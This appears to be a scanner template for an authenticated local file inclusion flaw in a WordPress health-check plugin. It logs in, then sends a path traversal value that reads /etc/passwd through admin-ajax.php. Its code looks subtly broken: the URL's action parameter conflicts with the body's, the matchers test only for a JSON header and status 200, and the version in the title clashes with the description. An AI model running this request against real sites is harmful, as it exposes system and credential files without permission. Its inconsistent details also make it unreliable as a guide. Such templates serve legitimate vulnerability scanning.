id: health-check-lfi
brief:
    title: WordPress Health Check & Troubleshooting <1.24 - Local File Inclusion
    by: DhiyaneshDK
    level: high
    about: WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.
    label:
        - lfi
        - wp
        - wordpress
        - wp-plugin
        - authenticated
        - lfr
        - wpscan
        - vuln
    score: CVSS:7.5
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - application/json
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: POST
      to:
        - '{{BaseURL}}/wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: action=health-check-view-file-diff&file=../../../../../../etc/passwd
      signs:
        - "on": word
          has:
            - application/json
          in: header
          need: all
        - "on": status
          status:
            - 200
